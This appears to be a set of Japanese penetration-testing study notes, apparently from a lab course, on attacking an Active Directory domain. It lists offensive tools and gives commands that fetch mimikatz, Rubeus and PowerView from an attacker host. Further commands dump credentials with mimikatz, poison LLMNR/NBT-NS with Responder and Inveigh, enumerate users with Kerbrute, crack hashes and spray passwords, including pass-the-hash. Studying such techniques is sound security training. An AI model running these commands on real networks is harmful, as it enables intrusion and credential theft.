
# 実践ツール集（Tools of the Trade）

| **ツール名**                           | **説明**                                                                                                                                                               |
| ---------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PowerView / SharpView**          | PowerShellベースおよび.NET移植版のAD列挙ツール。Windowsのnet*コマンドの代替として使用でき、BloodHoundと似た情報を手動で取得するのに役立ちます。特定のユーザーやコンピュータの調査、新しい認証情報の確認、KerberoastingやASREPRoastingに利用可能なユーザー発見などに便利。 |
| **BloodHound**                     | AD内の関係性を可視化し、攻撃経路を計画するためのツール。データ収集はPowerShellまたはC#版のSharpHoundで行い、Neo4jデータベースとElectronベースのGUIで解析します。                                                                 |
| **SharpHound**                     | C#で書かれたBloodHound用のデータ収集ツール。ユーザー、グループ、ACL、GPO、セッションなどの情報を収集し、JSON形式で出力します。                                                                                           |
| **BloodHound.py**                  | ImpacketベースのPython版BloodHound収集ツール。ドメイン未参加ホストから実行可能。                                                                                                                 |
| **Kerbrute**                       | Goで書かれたツール。Kerberosの事前認証を利用してADアカウントを列挙、パスワードスプレー、ブルートフォースが可能。                                                                                                       |
| **Impacketツールキット**                 | ネットワークプロトコルとのやり取りのためのPython製ツール集。AD列挙・攻撃用の多数のスクリプトを含む。                                                                                                               |
| **Responder**                      | LLMNR、NBT-NS、mDNSをポイズニングするための専用ツール。                                                                                                                                  |
| **Inveigh.ps1**                    | PowerShell製のネットワークスプーフィング・ポイズニングツール。Responderと似た機能。                                                                                                                  |
| **InveighZero (C# Inveigh)**       | InveighのC#版。取得したデータ（ユーザー名やハッシュなど）と対話可能な半インタラクティブツール。                                                                                                                 |
| **rpcinfo**                        | RPCサービスの状態確認やサービス一覧取得ができる。例：rpcinfo -p 10.0.0.1                                                                                                                      |
| **rpcclient**                      | Sambaスイートの一部。RPC経由でAD情報を列挙可能。                                                                                                                                        |
| **CrackMapExec (CME)**             | 列挙・攻撃・ポストエクスプロイトの統合ツール。SMB、WMI、WinRM、MSSQLなどを利用してADの機能を悪用。                                                                                                           |
| **Rubeus**                         | Kerberosの脆弱性を悪用するためのC#製ツール。                                                                                                                                          |
| **GetUserSPNs.py**                 | 一般ユーザーに紐づくSPN（サービスプリンシパル名）を列挙するImpacketスクリプト。                                                                                                                        |
| **Hashcat**                        | ハッシュのクラックやパスワードリカバリに特化した強力なツール。                                                                                                                                      |
| **enum4linux / enum4linux-ng**     | WindowsおよびSambaシステムからの情報収集ツール。ngはリワーク版。                                                                                                                              |
| **ldapsearch**                     | LDAPプロトコルと対話するための標準コマンドラインツール。                                                                                                                                       |
| **windapsearch**                   | LDAPクエリでADのユーザー、グループ、コンピューターを列挙するPythonスクリプト。                                                                                                                        |
| **DomainPasswordSpray.ps1**        | PowerShell製のドメイン全体へのパスワードスプレーツール。                                                                                                                                    |
| **LAPSToolkit**                    | PowerViewを利用してLAPS（ローカル管理者パスワードソリューション）導入環境の監査・攻撃を行うPowerShell関数群。                                                                                                   |
| **smbmap**                         | SMB共有の列挙とアクセス確認を行うツール。                                                                                                                                               |
| **psexec.py / wmiexec.py**         | Impacket製のPsexecおよびWMI経由でコマンドを実行するスクリプト。                                                                                                                             |
| **Snaffler**                       | ファイル共有内の資格情報などの機密情報を探すのに便利なツール。                                                                                                                                      |
| **smbserver.py**                   | シンプルなSMBサーバーを立ち上げてファイル共有を可能にするツール。                                                                                                                                   |
| **setspn.exe**                     | ADアカウントのSPNを追加・確認・削除するコマンド。                                                                                                                                          |
| **Mimikatz**                       | 平文パスワードの抽出、パス・ザ・ハッシュ、Kerberosチケットの抽出など多機能な攻撃ツール。                                                                                                                     |
| **secretsdump.py**                 | リモートホストからSAM・LSAシークレットをダンプ。                                                                                                                                          |
| **evil-winrm**                     | WinRMプロトコル経由で対話型シェルを取得するツール。                                                                                                                                         |
| **mssqlclient.py**                 | MSSQLデータベースと対話可能なImpacket製ツール。                                                                                                                                       |
| **noPac.py**                       | CVE-2021-42278および42287を利用したドメインユーザー→DAの昇格エクスプロイト。                                                                                                                    |
| **rpcdump.py**                     | RPCエンドポイントのマッピング情報を取得するImpacketツール。                                                                                                                                  |
| **CVE-2021-1675.py**               | PrintNightmare脆弱性（PoCスクリプト）。                                                                                                                                         |
| **ntlmrelayx.py**                  | SMBリレー攻撃を行うImpacketツール。                                                                                                                                              |
| **PetitPotam.py**                  | CVE-2021-36942を利用し、Windowsホストに別ホストへの認証を強制させるPoC。                                                                                                                     |
| **gettgtpkinit.py / getnthash.py** | Kerberos TGT・PACを操作し、NTハッシュの取得を試みるツール。                                                                                                                               |
| **adidnsdump**                     | ドメインからDNSレコードを列挙・ダンプするツール。ゾーントランスファと類似。                                                                                                                              |
| **gpp-decrypt**                    | グループポリシー設定ファイルからユーザー名・パスワードを抽出。                                                                                                                                      |
| **GetNPUsers.py**                  | ‘Kerberos事前認証不要’ 設定のユーザーを狙ったASREPRoasting攻撃用ツール。                                                                                                                     |
| **lookupsid.py**                   | SIDブルートフォースツール。                                                                                                                                                      |
| **ticketer.py**                    | TGT/TGSチケットの作成・カスタマイズ。ゴールデンチケットや信頼関係攻撃に利用可。                                                                                                                          |
| **raiseChild.py**                  | 子ドメイン→親ドメインへの権限昇格を自動化するImpacketツール。                                                                                                                                  |
| **Active Directory Explorer**      | ADのオブジェクト構造を閲覧・比較するGUIツール。スナップショット保存やオフライン分析にも対応。                                                                                                                    |
| **PingCastle**                     | AD環境のセキュリティ診断ツール。リスク評価と成熟度フレームワーク（CMMIベース）に基づいて分析。                                                                                                                   |
| **Group3r**                        | グループポリシーオブジェクト（GPO）のセキュリティ設定ミスを監査・発見するツール。                                                                                                                           |
| **ADRecon**                        | AD環境から多様なデータを収集し、Excelレポートとして出力。セキュリティの全体像を把握可能。                                                                                                                     |

# Windows上で使うツールを全部突っ込む
Linux上
```sh
# PowerView.ps1
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
# mimikatz
wget -O mimikatz.zip https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip
# Rubeus
wget -O rubeus.zip https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/archive/refs/heads/master.zip
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250518-5781f7e5/winPEASx64.exe
# HTTPサーバー立てる
python3 -m http.server 8080
```

Linux上
```sh
Attacker_IP="10.10.14.205"
wget http://$Attacker_IP:8080/PowerView.ps1
# mimikatz
wget http://$Attacker_IP:8080/mimikatz.zip
# Rubeus
wget http://$Attacker_IP:8080/rubeus.zip
```
Windows上
```Powershell
$Attacker_IP="10.10.14.205"
# PowerView.ps1
Invoke-WebRequest -Uri "http://$Attacker_IP:8080/PowerView.ps1" -OutFile "PowerView.ps1"
# mimikatz.zip
Invoke-WebRequest -Uri "http://$Attacker_IP:8080/mimikatz.zip" -OutFile "C:\Users\Public\Tools\mimikatz.zip"
# rubeus.zip
Invoke-WebRequest -Uri "http://$Attacker_IP:8080/rubeus.zip" -OutFile "C:\Users\Public\Tools\rubeus.zip"
Expand-Archive -Path "mimikatz.zip" -DestinationPath "mimikatz" -Force
Expand-Archive -Path "rubeus.zip" -DestinationPath "rubeus" -Force
import-module .\PowerView.ps1
```

Attacker_IPの変数が展開されないバージョン
```sh
Invoke-WebRequest -Uri "http://10.10.14.205:8080/PowerView.ps1" -OutFile "PowerView.ps1"
Invoke-WebRequest -Uri "http://10.10.14.205:8080/mimikatz.zip" -OutFile "mimikatz.zip"
Invoke-WebRequest -Uri "http://10.10.14.205:8080/rubeus.zip" -OutFile "rubeus.zip"
Expand-Archive -Path "mimikatz.zip" -DestinationPath "mimikatz" -Force
Expand-Archive -Path "rubeus.zip" -DestinationPath "rubeus" -Force
import-module .\PowerView.ps1
```

# 侵入できた後の列挙
## とりまMimikatz
ダウンロード
```sh
wget https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe
```

コピー
```sh
$url = 'http://172.16.1.100:1235/mimikatz.exe'
$dest = 'C:\Users\Public\mimikatz.exe'
(New-Object System.Net.WebClient).DownloadFile($url, $dest)
Test-Path $dest
```

実行
```ps
.\mimikatz.exe "privilege::debug" "log full.txt" "sekurlsa::logonpasswords" "lsadump::lsa" "lsadump::secrets" "exit"
```

## WinPEAS
```SH
./winPEASx64.exe
```





# ドメインの初期列挙
**シナリオ**
我々がSSHで接続できるように設定された、内部ネットワーク上のカスタムペンテスト用仮想マシン。
- 必要に応じてツールをインストールできるWindowsホストも提供。
- 認証なしの状態からテストを開始。ただし、Windowsホストにアクセスするための標準ドメインユーザーアカウント（htb-student）も提供。
- 「グレーボックス」形式のテスト。ネットワーク範囲として「172.16.5.0/23」が提供されており、それ以外のネットワーク情報は提供されていない。
- 非回避型テスト（つまり、検出されることを恐れずに実行する通常の手法）。
- 認証情報や内部ネットワークの詳細なマップは提供されていない。


今回注目すべき重要なデータポイント（メモツールにしっかり記録！）

| **データポイント**        | **説明**                                                                 |
| ------------------ | ---------------------------------------------------------------------- |
| **ADユーザー**         | パスワードスプレー攻撃の対象となる有効なユーザーアカウントの列挙を試みる                                   |
| **ドメイン参加済みコンピュータ** | 重要なホスト（例：ドメインコントローラー、ファイルサーバ、SQLサーバ、Webサーバ、Exchangeメールサーバ、データベースサーバなど） |
| **重要なサービス**        | Kerberos、NetBIOS、LDAP、DNSなど                                            |
| **脆弱なホスト・サービス**    | 簡単に攻撃・侵入できそうなもの（いわゆる「クイックウィン」）                                         |

## 攻撃手法（TTPs）
- Active Directory環境の列挙は、計画なしでやると情報量が多すぎて圧倒されされる
- ADには膨大なデータが詰まっているので、段階的に進めないと見落としが出るリスクが高い
- **あらかじめ作戦を立てて、一つずつ確実に進めていく**必要がある

どう進めるにしても、最初に見るべき情報やポイントは大体共通している

ステップ概要
1. **パッシブなホストの検出**から開始
2. **アクティブにホストを検証**して、サービスの詳細、ホスト名、脆弱性の有無を調査
3. **存在が確認できたホストをさらに掘り下げる**
4. 情報が一通り集まったところで一度整理し、次のステップへ進む判断をする

終わった時点での理想的な目標
- **資格情報を入手しているか、ドメイン参加ホストへの足がかり**ができていると理想的
- Linux攻撃ホストから**認証付きの列挙**を開始できる状態

### パッシブなホストの検出から開始
- ネットワークの様子を「観察」する
	- Wireshark や TCPDump を使って、「ネットワークの音に耳を傾ける」ことで、どんなホストがいるのか、どんな種類のトラフィックが流れているのかを確認する
- レイヤー2（データリンク層）レベルの基本的なパケット
	- ARP リクエスト／リプライ
		- IPアドレスからMACアドレスを調べるプロトコル
	- MDNS（マルチキャストDNS）
		- LAN内で名前解決（名前→IPアドレス）をするプロトコル
	- NetBIOS（名前解決やファイル共有に関係するもの）
	- LLMNR（Link-Local Multicast Name Resolution）
		- 同じネットワーク内での名前解決に使われる（悪用もされやすい）
- スイッチドネットワークに接続しているため、**同じブロードキャストドメイン内の通信に限定**される
- それでもネットワーク構成を理解するための手がかりになる


Wireshark を ea-attack01 上で起動する
```sh
┌─[htb-student@ea-attack01]─[~]
└──╼ $ sudo -E wireshark
```

そのほかのツール
GUI
- WireShark
- pktmon.exe
	- Windowsのみ
	- Windows 10 すべてのエディションに標準で入っているネットワークモニタリングツール
CUIだけ
- tcpdump
	- ネットワークパケットのキャプチャ＆保存
	- tcpdumpで**キャプチャデータを.pcapファイルとして保存**しておき、それを別のGUIがあるマシンに転送して**Wiresharkで開いて解析する**、というやり方もできる
- net-creds
	- ネットワーク上の資格情報を抽出
- NetMiner
	- トラフィックの解析に使えるツール

tcpdumpの例
```shell-session
sudo tcpdump -i ens224 -w capture.pcap
```

キャプチャしたPCAPファイルは保存する！！！
- 後から見直して、ヒントや見落としを拾えるかもしれない
- レポート作成時の補足資料としても非常に役立つ

#### Responderでの解析

最初のネットワーク監視では、**MDNS**や**ARP**経由でいくつかのホストの存在が分かった
**Responder** というツールを使って、ネットワークを解析する

Responderとは
- 以下のようなリクエストを監視・解析・悪意のあるレスポンスを返すためのツール
	- LLMNR（Link-Local Multicast Name Resolution）
	- NBT-NS（NetBIOS Name Service）
	- MDNS（Multicast DNS）

今回はその中でも「解析モード（Analyze mode）」のみを使う
- 完全にパッシブ（受動的）にネットワークを監視するだけで、悪意あるレスポンスは一切送信しない
```bash
┌─[htb-student@ea-attack01]─[~]
sudo responder -I ens224 -A 
```
- `-I`：インターフェースを指定（例：ens224）
- `-A`：Analyzeモード（受動的に観察するだけ）

出力されたホストはターゲットリストとして、メモしておく
後で、ターゲットリストとして使う

#### fpingでの生きているホストの調査
パッシブチェックでいくつかのホストが見えたので、次はアクティブな方法で確認する

 fping を使って、**サブネット内のICMPスイープ（Ping調査）**を行う
 
fpingとは
- fping は、通常の ping と同様に ICMP（Internet Control Message Protocol） を使ってホストとの通信を行う
- 強み
	- 複数のホストを同時に調査可能（リストやCIDR範囲に対応）
	- スクリプト化しやすい（自動化向き）
	- ラウンドロビン方式で効率的にPingを送る（1つのホストに複数回待たず、複数ホストに順番に送る）
- 内部ネットワークで他にアクティブなホストがいないかを調べることができる
- ICMPだけですべてのホストが分かるわけではありませんが、ネットワーク上に何がいるのかをざっくり把握するには手軽で効果的な方法
- この調査で得られたIPに対して、あとでポートスキャンやサービス調査をしていく流れになります。

```sh
fping -asgq 172.16.5.0/23
```

オプションの意味
- `-a`：応答があった（aliveな）ホストだけを表示
- `-s`：スキャン終了時に統計情報を表示
- `-g`：CIDR表記からホストの一覧を自動生成
- `-q`：個々のPing結果は表示せず、静かに実行

## ホストの詳細調査
上のICMPスワープで生きているホストに対して、詳細な情報を取得する
また、ここでの調査は、**今後のドメイン列挙の方向性を決めるヒント**になる
[[Pentest_Technique/Linux・Windows共通]]の「Nmapポートスキャン」のコマンドを実行する
- Nmapでの調査では、DCのホスト名や、OS・サービスのバージョンがわかる
- 古いOSのホストが見つかれば、昔の脆弱性が残っている可能性があるから、侵入が楽になるかもしれない
- そのようなレガシーOSが使われているということは、古い脆弱性が残っている可能性がある
	- たとえば、EternalBlue や MS08-067 などの古典的な脆弱性が、まだ通用するかもしれない
	- うまくいけば、SYSTEM権限のシェルが取得できる可能性もある

一見すると、古いソフトウェアやサポート終了済みのOSが使われているのはおかしな話に思える
- 大企業ではいまだによくあること
- 例えば
	- 製造ラインや空調制御（HVAC）など、古いシステム上で長年稼働している設備がある
	- それらを停止・交換するのはコストが高く、業務に支障をきたす可能性があるため、古いまま使い続けていることが多い

こうしたレガシー環境は、ファイアウォールやIDS/IPSで外部から守ろうとする傾向がある
でも、一度侵入できれば、比較的容易に足がかり（foothold）を作れる可能性が高い

### ドメインコントローラーぽいポートやサービス
| **ポート**        | **サービス名**            | **判断材料としての意味**            |
| -------------- | -------------------- | ------------------------- |
| 88/tcp         | Kerberos             | DCの重要機能、これが開いてるとDCの可能性高い  |
| 135/tcp        | RPC                  | DCでもよく使われるが他のWindows機でもある |
| 139, 445/tcp   | SMB                  | これも汎用的なので単体では判定できない       |
| 389/tcp        | LDAP                 | これはDCが持ってるディレクトリサービス      |
| 636/tcp        | LDAPS（LDAP over SSL） | 同上（セキュア版）                 |
| 3268, 3269/tcp | Global Catalog       | これが開いてたら**ほぼ確定でDC**       |
- 88, 389, 445, 3268 がセットで開いてたら、ほぼDC。
- nmap -sVでサービスのバナー取得できれば、もっと確実に分かる（例：Windows Server 2019 Domain Controller的な表記）。
- SMBでホスト名取得できれば、`*-DC01`みたいな名前から推測も可能。
- `ldapsearch`や`rpcclient -U "" -N <IP>`でも追加の情報引き出せる。

## ドメインユーザーアカウントを見つける

### ユーザーの特定
- クライアントからテスト用のユーザーアカウントが提供されないことは多い
### Kerbrute を使った内部ADユーザーブルートフォース
Kerbrute
- Kerbrute は、ドメインアカウントの列挙をステルスに行えるツール
- このコマンドは、「存在するADユーザー名をKerberosを使って枚挙する」ために使うやつ。
- Kerberosの事前認証の失敗は、ログやアラートに記録されにくい
- Insidetrust の jsmith.txt や jsmith2.txt のようなユーザーリストと組み合わせて使う
	- Insidetrust  : https://github.com/insidetrust/statistically-likely-usernames
	- このリポジトリには、未認証状態からユーザー列挙を始めるのに役立つ、多様なユーザーリストが揃っている

上で見つけたホストに対して使用する
2種類の使用法
- Linux、Windows、Mac用に**あらかじめビルドされたバイナリをダウンロード**
	- gitでcloneしてmake installする
- 自分でソースコードをクローンしてビルドすることもできる
	- https://github.com/ropnop/kerbrute/releases/tag/v1.0.3

```shell-session
sudo git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
sudo make all
ls dist/
```

対象のアーキテクチャの実行ファイルを実行する 
```sh
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

| **オプション**              | **説明**                                                       |
| ---------------------- | ------------------------------------------------------------ |
| userenum               | kerbruteのモード。これはユーザー名の列挙を行うモード。                              |
| -d INLANEFREIGHT.LOCAL | ターゲットのActive Directoryドメイン名。                                 |
| --dc 172.16.5.5        | ドメインコントローラー（Domain Controller）のIPアドレス。Kerberosパケットをこのホストに送る。 |
| jsmith.txt             | ユーザー名のリストを含むファイル。このリストを元にユーザーの存在を確認する。                       |
| -o valid_ad_users      | 出力ファイル名。見つかった有効ユーザー名がこのファイルに保存される。                           |

## 認証情報を探す
目的 : ドメインユーザーアカウントの平文の認証情報を取得し、認証済みで次の調査フェーズへ進むこと
使用する攻撃手法 : ネットワークポイズニングとパスワードスプレー
### LLMNR / NBT-NS ポイズニング from Linux
**LLMNR** : リンクローカルマルチキャスト名前解決
**NBT-NS** : NetBIOS名前サービス
それぞれに対するブロードキャストに対する中間者攻撃を行う

### LLMNR / NBT-NSに対する基礎知識
- 両方ともMicrosoft Windowsの機能で、DNSによる名前解決が失敗した時の大体手段
	- LLMNR
		- あるマシンがホスト名の解決を試した時に、DNSで解決できない時に、そのマシンはネットワーク内のすべてのマシンに向けて、正しいアドレスを問い合わせる
		- DNS形式に基づいて、同一ネットワークセグメント内のホスト同士で、名前解決を行う
		- UDP 5355を使用する
	- NBT-NS
		- LLMNRで解決できない場合は、NBT-NSが使用される
		- NBT-NSは、ローカルネットワーク上のシステムをNetBIOS名で識別する
		- UDP 137を使用する
- 重要ポイント
	- LLMNR / NBT-NSを使った名前解決は**ネットワーク上の誰でも応答できてしまう**

- Responderというツールで、このリクエストをポイズニングできる
	- ネットワークセグメントに所属するはずのマシンを装うことができる
	- つまり、LLMNR / NBT-NSのリクエストに対して、正しい応答をしているマシンのフリをして返答することで、リクエストを掌握後のマシンに誘導する
- リクエストが名前解決や認証を必要とする場合
	- NetNTLMハッシュを取得できたりするかも
		- ハッシュをクラックすることで、平文のパスワードを取得できる
- LLMNR / NBT-NSのスプーフィング(なりすまし)とSMB署名の欠如を組み合わせることで、ドメイン内のホストに対して、管理者権限を取得できるかも

### クイック例：LLMNR/NBT-NSポイズニング
1.	あるホストが、プリントサーバー `\\print01.inlanefreight.local` に接続しようとしますが、誤って `\\printer01.inlanefreight.local` とタイプしてしまいます。
2.	DNSサーバーは、「そのホストは存在しない」と応答します。
3.	ホストは次に、ローカルネットワーク全体に向けて「誰か `\\printer01.inlanefreight.local` の場所を知っているか？」とブロードキャストします。
4.	攻撃者（Responderを動作させている私たち）は、まるで自分がそのホストであるかのように応答します。
5.	ホストはその応答を信じ、認証リクエスト（ユーザー名とNTLMv2のパスワードハッシュ付き）を攻撃者に送信します。
6.	攻撃者はこのハッシュをオフラインでクラックするか、条件が揃えばSMBリレー攻撃に利用することができます。

### TTPs
目的 : ネットワーク上に送信される認証情報、具体的にはNTLMv1・NTLMv2パスワードハッシュを収集すること
Linuxで使えるLLMNR / NBT-NSポイズニングツール↓

|                |                                                 |
| -------------- | ----------------------------------------------- |
| **Responder**  | LLMNR、NBT-NS、MDNSを毒するために設計された専用ツール。多機能です。       |
| **Inveigh**    | クロスプラットフォーム対応のMITM（中間者）ツール。スプーフィングやポイズニングに使用可能。 |
| **Metasploit** | 複数のスキャナやスプーフィングモジュールがあり、ポイズニング攻撃に対応。            |
- Responderは Python製 で、主にLinux攻撃ホストで使われますが、Windows上で動作する .exe 版も存在します。
- Inveighは C# および PowerShell（レガシー版） で書かれています。

これらのツールは以下のプロトコルに対して攻撃可能
	•	LLMNR
	•	DNS
	•	MDNS（マルチキャストDNS）
	•	NBNS（NetBIOS Name Service）
	•	DHCP
	•	ICMP
	•	HTTP
	•	HTTPS
	•	SMB
	•	LDAP
	•	WebDAV
	•	プロキシ認証（Proxy Auth）
Responderはさらに以下にも対応
	•	MSSQL
	•	DCE-RPC
	•	FTP、POP3、IMAP、SMTPの認証

#### Responder
**攻撃マシンがLinuxの場合に使える**
一般的によく使うオプション
- `-A`
	- アナライズ(分析)モード
	- NBT-NS・BROWSER・LLMNRリクエストを見ることができる
	- 応答したりポイズニングは行なわない
- `-w` と `-f` の組み合わせ
	- `-w`
		- WPADプロキシサーバーを有効化する
		- 特に大規模な組織では非常に効果的で、Internet Explorerが自動検出設定を有効にしている場合、ユーザーのすべてのHTTPリクエストをキャプチャできる
	- `-f` 
		- リモートホストのOSやバージョンの フィンガープリント（特定） を試みる
	- `-v` フラグ
		- 詳細モード（冗長出力）・問題のトラブルシュートには便利だが、コンソールに大量の情報が表示される
	- `-F` や `-P` フラグ
		- これらは NTLMやBasic認証の強制、および プロキシ認証の強制を行う
		- ただし、これを使うとユーザーにログインプロンプトが表示される可能性があるため、慎重に使うべき

- SMBなどの偽サーバー（Rogue Servers）は、Responder.conf ファイルで無効化することが可能
- Responderはネットワーク上で観測されたリクエストに対して傍受して応答する
- 攻撃が成功してハッシュをキャプチャできた場合、Responderはそれを画面に表示し、ホストごとのログファイルに保存する
	- 保存場所
		- `/usr/share/responder/logs ディレクトリ内`
	- ファイル名の形式
		- (モジュール名)-(ハッシュタイプ)-(クライアントのIPアドレス).txt
		- 例： SMB-NTLMv2-SSP-172.16.5.25.txt

Responderの起動
- `-I` : ネットワークインターフェースを指定
```sh
sudo responder -I ens224
```

典型
```sh
sudo responder -I ens5 -F -w
```


- Responderを起動したら、しばらくの間を実行させておいて、他の情報収集を進める
- NetNTLMv2ハッシュはクラック後に非常に有用ですが、「パス・ザ・ハッシュ（Pass-the-Hash）」のような技術では直接使用できない
- そのため、オフラインでクラックする必要がある
```shell-session
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

#### Inveigh
**攻撃マシンがWindowsの場合に使える**
- PowerShellとC#で書かれている
	- Inveigh は、IPv4 と IPv6 と、`LLMNR`、DNS、`mDNS`、NBNS、`DHCPv6`、ICMPv6、`HTTP`、HTTPS、`SMB`、LDAP、`WebDAV`、および Proxy Auth などの他のいくつかのプロトコルをリッスンできる

使い方
- 詳細は、wikiに書いてある
	- https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters

起動
```powershell
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1
PS C:\htb> Import-Module .\Inveigh.ps1
```

LLMNR と NBNS のなりすましで Inveigh を開始し、コンソールに出力してファイルに書き込み
```powershell
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
- `-NBNS Y`
	- NBNS（NetBIOS Name Service）スプーフィングを有効にする
- `-ConsoleOutput Y`
	- PowerShell コンソール上にログを表示させるオプション
	- 攻撃の結果やキャプチャされた認証情報などをリアルタイムで見たいときに便利
- `-FileOutput Y`
	- ログをファイルに出力するオプション
	- 後から確認したり、ログとして保管しておきたいときに使う


ちなみに、InveighのPowershellバージョンは、更新されなくなっちゃった
C#バージョンが更新されているけど、コンパイルが必要なので、だるい

Inveigh.exeが実行されている間、`esc`キーを押してコンソールに入ることができる
コンソールで使えるコマンド
- `HELP`
	- いくつかのオプションが表示
- `GET NTLMV2UNIQUE`
	- キャプチャされた一意のハッシュをすばやく表示できる
- `GET NTLMV2USERNAMES`と入力して、収集したユーザー名を確認できる
	- 追加の列挙を実行し、Hashcatを使用してオフラインでクラックする価値のあるユーザーのリストを確認したい場合に役立つ

## パスワードスプレー
### パスワードポリシーの列挙
[[Pentest_Technique/Linux・Windows共通]]の「Samba(SMB)」にも少し書いてる
- Active Directory の新しいドメインを作成したときの「デフォルト」の最小パスワード長は 7 文字

攻撃マシンがLinuxの場合
- LDAP匿名バインド
```shell-session
snowyowl644@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

攻撃マシンがWindowsの場合
ツールとかを新しくインストールできない場合
- net.exeを使える
```cmd
C:\htb> net accounts
```

ツールを新しくインストールできる場合
- PowerViewが非常に便利
```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

他の使えるツール
- CrackMapExecやSharpMapExecと同様に、PowerViewやSharpView
	- でも、どれを使うかは、EDRとかFirewallによって変わる

### ターゲットユーザーリストの作成
パスワードスプレー攻撃には、まず、有効なドメインユーザーリストを作成する必要がある

ドメインユーザーリストを作成する例
- SMB NULLセッションを利用して、ドメインコントローラからドメインユーザーの完全なリストを取得する
- LDAP匿名バインディングを利用してLDAPを匿名で照会し、ドメインユーザーリストをプルダウンする
- `Kerbrute`などのツールを使用して、[統計的に可能性が高いユーザー名](https://github.com/insidetrust/statistically-likely-usernames)GitHubリポジトリなどのソースからの単語リストを使用してユーザーを検証するか、[linkedin2username](https://github.com/initstring/linkedin2username)などのツールを使用して収集して、潜在的に有効なユーザーのリストを作成する
- クライアントから提供されたLinuxまたはWindows攻撃システムからの資格情報のセットを使用して、または`Responder`を使用したLLMNR/NBT-NSリクエストポイズニング、またはより小さなワードリストを使用した成功したパスワードスプレーなどの他の手段で取得する

enum4linux
```shell-session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

rpcclient
```shell-session
rpcclient -U "" -N 172.16.5.5
$> enumdomusers 
```

CrackMapExec
```shell-session
crackmapexec smb 172.16.5.5 --users
```

ldapsearch
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

windapsearch
- 独自のLDAP検索フィルターを作成する方法を理解する必要
- `-u`フラグと`-U`フラグが付いた空白のユーザー名を提供することで、匿名アクセスを指定して、ツールにユーザーのみを取得する
```shell-session
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

Kerbrute
- [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication)を使用しているので、ログオンの失敗を引き起こすことはなく、アカウントをロックアウトすることはない
- [statistically-likely-usernames GitHubリポジトリ](https://github.com/insidetrust/statistically-likely-usernames)を使うことで、Kerbrute を使って有効なユーザー名を列挙するために使える
- もし、これで見つからなかった場合は、辞書ファイルを変更する必要がある
```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
- `userenum`：ユーザー列挙モード
- `-d inlanefreight.local`：対象の **ドメイン名**
- `--dc 172.16.5.5`：対象の **ドメインコントローラのIPアドレス**
- `/opt/jsmith.txt`：ユーザー名候補の辞書ファイル

もし、一つでも有効な認証情報があるなら、CrackMapExecでユーザーリストを作れる
```shell
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
出力

|             |                        |
| ----------- | ---------------------- |
| badPwdCount | 失敗したログイン試行のカウント        |
| badPwdTime  | 最後にパスワードが間違えられた時刻（UTC） |
| lastLogon   | 最後に成功したインタラクティブログオンの時刻 |
### パスワードスプレーの実行
#### Linux
rpcclient
- 普通では、ログインが失敗したか成功したかはわからない
- ログイン成功時の応答には Authority Name が含まれるため、それを使って成功したログインを判定する
この性質を使って、シェルワンライナーを書ける
```sh
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Kerbrute
- パスワード攻撃
```shell-session
snowyowl644@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
オプション

|                 |                                                                                                                         |
| --------------- | ----------------------------------------------------------------------------------------------------------------------- |
| valid_users.txt | テスト対象のユーザー名リスト                                                                                                          |
| Welcome1        | テストするパスワード（全ユーザーにこのパスワードをスプレー）                                                                                          |
| passwordspray   | これは kerbrute の**モード**（サブコマンド）です。ユーザー名のリストに対して1つのパスワードを使ってログインを試みる<br>→ このモードを指定することで、Kerberos 認証を使って “横一列” にパスワードスプレーする |
CrackMapExec
- パスワードスプレー攻撃
```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
- 単一ユーザーでのログイン
```shell-session
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

##### 管理者パスワードの再利用
- 内部パスワードスプレーは、ドメインユーザーアカウントに対してだけでなく、ローカル管理者アカウント（またはその他の特権を持つローカルアカウント）にも実行できる
- ローカル管理者アカウントの NTLMハッシュ や 平文パスワード を取得できれば、それを使ってネットワーク内の複数のホストに対して認証を試すことが可能
- ローカル管理者アカウントのパスワード再利用は、企業内で**ゴールドイメージ（標準化されたOSイメージ）を使って展開を自動化する際に、複数ホストに同じパスワードを設定するのが簡単なため、非常によくある
以下のコマンドで試す
```shell-session
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

#### Windows
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)を使って、パスワードスプレーを行うことができる
- ドメインに認証されているとき
	- **パスワードスプレーするパスワードだけ指定すればいい**
	- このツールは自動的に Active Directory からユーザーリストを生成してパスワードスプレー攻撃を実行
	- ドメインのパスワードポリシーを照会し、さらに ロックアウトまで1回の試行しか残されていないユーザーアカウントを除外してくれる
